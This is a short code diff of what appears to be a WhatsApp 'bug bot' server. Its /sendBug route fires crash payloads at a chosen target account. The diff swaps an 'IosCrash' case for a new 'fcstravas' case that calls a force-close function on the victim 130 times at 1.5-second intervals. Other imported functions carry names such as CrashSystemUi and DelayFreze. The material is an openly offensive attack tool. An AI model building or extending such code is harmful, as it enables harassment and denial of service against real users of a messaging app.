@@ -12,6 +12,7 @@ const {
   bleng,
   DelayHard,
   DelayFreze,
+  fcstravas,
   yhcv,
   CrashSystemUi,
   StravasForclose,
@@ -372,11 +373,9 @@ router.get("/sendBug", async (req, res) => {
             await sleep(1500);
           }
           break;
-          case "IosCrash":
+          case "fcstravas":
           for (let i = 0; i < 130; i++) {
-            await IosCrash(sock, targetJid);
-            await sleep(1500);
-            await AhhCrot(sock, targetJid);
+            await fcstravas(sock, targetJid);
             await sleep(1500);
           }
           break;
